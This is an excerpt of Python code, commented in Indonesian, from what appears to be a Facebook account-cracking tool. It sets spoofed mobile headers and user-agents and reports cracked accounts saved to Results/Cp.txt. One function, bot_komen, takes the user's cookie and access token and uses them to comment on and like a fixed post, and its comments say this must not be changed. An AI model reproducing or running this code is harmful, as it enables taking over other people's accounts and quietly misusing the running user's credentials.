...
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        ...
        response = r.post('https://graph.facebook.com/pfbid0nCD782Lig1WrbL6XpC87oxjsnnEjBAd2ZnKWat6ZXfPo8LNTxfs2X35oFKH762cYl/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/pfbid0nCD782Lig1WrbL6XpC87oxjsnnEjBAd2ZnKWat6ZXfPo8LNTxfs2X35oFKH762cYl/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        ...
        try:
            with requests.Session() as r:
                r.headers.update({
                    ...
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; GT-I9505 Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_model = random.choice(['GT-I9505', 'GT-I9505', 'GT-I9505', 'GT-I9505', 'GT-I9505', 'GT-I9505'])
